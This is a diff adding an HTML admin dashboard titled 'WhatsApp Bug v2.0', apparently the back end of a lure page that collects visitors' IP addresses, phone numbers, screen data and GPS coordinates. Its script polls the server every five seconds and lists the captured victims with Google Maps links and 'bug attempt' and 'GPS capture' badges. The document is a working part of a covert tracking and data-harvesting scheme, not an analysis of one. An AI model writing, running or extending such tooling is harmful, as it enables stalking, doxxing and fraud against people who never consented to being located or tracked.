@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Admin Panel - WhatsApp Bug</title>
+    <style>
+        body { font-family: monospace; background: #0a0a0a; color: #0f0; margin: 0; padding: 20px; }
+        h1 { color: #00eeff; border-bottom: 2px solid #0f0; padding-bottom: 10px; }
+        .log-entry { background: #111; border-left: 5px solid #0f0; margin: 10px 0; padding: 15px; border-radius: 5px; }
+        .ip { color: #ffaa00; font-weight: bold; }
+        .phone { color: #00eeff; }
+        .gps { color: #ff5555; }
+        .time { color: #aaa; font-size: 12px; }
+        .action-bug { border-left-color: #ff5555; }
+        .action-gps { border-left-color: #00eeff; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
+        th { background: #222; }
+        .badge { display: inline-block; padding: 3px 10px; border-radius: 10px; font-size: 12px; }
+        .badge-visit { background: #333; color: #0f0; }
+        .badge-bug { background: #550000; color: #ff5555; }
+        .badge-gps { background: #003355; color: #00eeff; }
+    </style>
+</head>
+<body>
+    <h1><i class="fas fa-skull-crossbones"></i> ADMIN PANEL - WHATSAPP BUG v2.0</h1>
+    <p>Server: <span id="serverStatus">ONLINE</span> | Total Data: <span id="totalData">0</span> | GPS Captures: <span id="gpsCount">0</span></p>
+    <button onclick="refreshData()">Refresh Data</button>
+    <hr>
+    <div id="logs"></div>
+
+    <script>
+        async function refreshData() {
+            const res = await fetch('/admin/data');
+            const data = await res.json();
+            document.getElementById('totalData').textContent = data.length;
+            const gps = data.filter(d => d.gps).length;
+            document.getElementById('gpsCount').textContent = gps;
+            
+            let html = '';
+            data.reverse().slice(0, 50).forEach(entry => {
+                let badge = `<span class="badge badge-visit">VISIT</span>`;
+                if (entry.action === 'bug_attempt') badge = `<span class="badge badge-bug">BUG</span>`;
+                if (entry.action === 'gps_capture') badge = `<span class="badge badge-gps">GPS</span>`;
+                
+                html += `
+                <div class="log-entry ${entry.action}">
+                    ${badge} <span class="time">[${entry.timestamp}]</span><br>
+                    <strong>IP:</strong> <span class="ip">${entry.ip}</span> | 
+                    <strong>Screen:</strong> ${entry.screen}<br>
+                    ${entry.phone ? `<strong>Phone:</strong> <span class="phone">${entry.phone}</span> | ` : ''}
+                    ${entry.method ? `<strong>Method:</strong> ${entry.method} | ` : ''}
+                    ${entry.gps ? `<strong>GPS:</strong> <span class="gps">${entry.gps} (${entry.accuracy}m)</span> | 
+                    <a href="https://maps.google.com/?q=${entry.gps}" target="_blank">View Map</a>` : ''}
+                </div>`;
+            });
+            document.getElementById('logs').innerHTML = html;
+        }
+        refreshData();
+        setInterval(refreshData, 5000);
+    </script>
+</body>
+</html>
